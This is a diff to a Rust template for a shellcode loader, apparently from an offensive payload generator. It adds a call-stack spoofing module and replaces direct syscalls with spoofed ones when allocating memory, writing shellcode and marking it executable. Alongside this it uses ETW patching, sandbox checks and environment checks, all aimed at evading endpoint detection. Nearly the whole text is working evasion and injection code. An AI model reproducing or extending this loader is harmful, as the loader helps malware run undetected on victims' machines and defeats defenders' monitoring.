@@ -4,6 +4,8 @@
 {{LITCRYPT_SETUP}}
 {{COMMON_MODULE}}
 
+{{STACK_SPOOF_MODULE}}
+
 {{ETW_PATCH_FUNCTION}}
 
 use std::ptr::null_mut;
@@ -48,14 +50,14 @@ fn inject_shellcode(mut buf: Vec<u8>) {
 
         let mut region_base: *mut c_void = null_mut();
         let mut region_size: usize = buf_len;
-        let status = syscall!("NtAllocateVirtualMemory", NtCurrentProcess, &mut region_base, 0_usize, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        let status = spoofed_syscall!("NtAllocateVirtualMemory", NtCurrentProcess, &mut region_base, 0_usize, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if !NT_SUCCESS(status) { return; }
 
         pause(150);
 
         let mut bytes_written: usize = 0;
         let src = buf.as_mut_ptr() as *mut c_void;
-        let status = syscall!("NtWriteVirtualMemory", NtCurrentProcess, region_base, src, buf_len, &mut bytes_written);
+        let status = spoofed_syscall!("NtWriteVirtualMemory", NtCurrentProcess, region_base, src, buf_len, &mut bytes_written);
         if !NT_SUCCESS(status) { return; }
 
         common::wipe(&mut buf);
@@ -64,7 +66,7 @@ fn inject_shellcode(mut buf: Vec<u8>) {
 
         let mut old_protect: u32 = 0;
         let mut protect_size: usize = buf_len;
-        let status = syscall!("NtProtectVirtualMemory", NtCurrentProcess, &mut region_base, &mut protect_size, PAGE_EXECUTE_READ, &mut old_protect);
+        let status = spoofed_syscall!("NtProtectVirtualMemory", NtCurrentProcess, &mut region_base, &mut protect_size, PAGE_EXECUTE_READ, &mut old_protect);
         if !NT_SUCCESS(status) { return; }
 
         pause(100);
@@ -83,6 +85,7 @@ fn inject_shellcode(mut buf: Vec<u8>) {
 fn main() {
     {{SANDBOX}}
     {{ETW_PATCH_CALL}}
+    {{STACK_SPOOF_INIT}}
 
     if !check_environment() { return; }
 
